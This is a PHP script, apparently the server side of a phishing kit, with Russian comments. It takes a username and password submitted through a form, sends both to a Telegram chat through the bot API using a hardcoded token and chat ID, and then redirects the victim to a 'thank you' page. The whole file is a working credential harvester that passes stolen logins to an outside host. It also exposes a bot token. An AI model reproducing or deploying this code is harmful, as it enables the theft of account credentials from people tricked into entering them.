<?php

/* https://api.telegram.org/bot5900916920:AAFzq5OQ50rYMYtCNeqibPW_MTrI7IvP6jw/getUpdates,
где, XXXXXXXXXXXXXXXXXXXXXXX - токен вашего бота, полученный ранее */

$name = $_POST['idi'];
$pass = $_POST['bek'];
$token = "5900916920:AAFzq5OQ50rYMYtCNeqibPW_MTrI7IvP6jw";
$chat_id = "-821200456";
$arr = array(
  'Имя пользователя: ' => $name,
  'Пароль: ' => $pass
);

foreach($arr as $key => $value) {
  $txt .= "<b>".$key."</b> ".$value."%0A";
};

$sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}","r");

if ($sendToTelegram) {
  header('Location: thankyou.html');
} else {
  echo "Error";
}
?>